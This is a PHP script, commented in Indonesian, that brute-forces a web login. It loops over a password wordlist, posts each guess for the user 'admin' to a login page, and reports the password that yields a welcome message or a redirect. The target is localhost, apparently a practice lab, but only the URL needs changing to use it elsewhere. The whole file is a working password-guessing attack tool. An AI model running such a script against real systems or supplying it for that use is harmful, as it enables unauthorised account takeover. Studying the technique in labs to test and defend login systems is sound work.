<?php
$loginUrl = "http://localhost/simulasi-traversal/login.php"; // URL proses login
$username = "admin"; // Username target
$wordlistFile = "passwordlist.txt"; // Daftar password

// Cek file wordlist
if (!file_exists($wordlistFile)) {
    die("File wordlist tidak ditemukan: $wordlistFile\n");
}

$passwords = file($wordlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($passwords as $password) {
    $postData = http_build_query([
        'username' => $username,
        'password' => $password
    ]);

    $ch = curl_init($loginUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Ubah deteksi sukses sesuai dengan sistem target
    if (strpos($response, "Selamat datang") !== false || $httpCode == 302) {
        echo "[+] BERHASIL: Password ditemukan => '$password'\n";
        break;
    } else {
        echo "[-] Gagal login dengan password: $password\n";
    }
}
?>
